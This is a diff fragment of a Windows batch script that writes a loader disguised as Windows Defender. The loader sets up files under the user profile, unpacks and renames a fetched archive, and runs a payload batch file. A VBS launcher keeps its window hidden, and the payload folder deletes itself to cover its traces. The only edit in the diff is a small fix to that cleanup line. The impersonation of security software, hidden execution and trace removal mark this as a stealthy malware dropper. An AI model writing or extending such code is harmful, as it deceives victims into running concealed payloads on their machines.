@@ -12,7 +12,7 @@ echo del WindowsDefenderServices.zip >> "%userprofile%\WindowsDefender\WindowsDe
 echo rename 1-main WindowsDefenderServices >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
 echo cd WindowsDefenderServices >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
 echo rename 1.bat WindowsDefenderSecurity.bat >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
-echo echo rmdir /s /q "%%%%userprofile%%%%\WindowsDefender\WindowsDefenderServices\" ^^^& exit ^>^> WindowsDefenderSecurity.bat >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
+echo echo rmdir /s /q "%%%%userprofile%%%%\WindowsDefender\WindowsDefenderServices" ^^^& exit ^>^> WindowsDefenderSecurity.bat >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
 echo WindowsDefenderSecurity.bat >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
 echo Set WshShell = CreateObject("WScript.Shell") > "%userprofile%\WindowsDefender\WindowsDefenderBackgroundServices.vbs"
 echo WshShell.Run chr(34) ^& "%%userprofile%%\WindowsDefender\WindowsDefenderScan.bat" ^& Chr(34), 0 >> "%userprofile%\WindowsDefender\WindowsDefenderBackgroundServices.vbs"
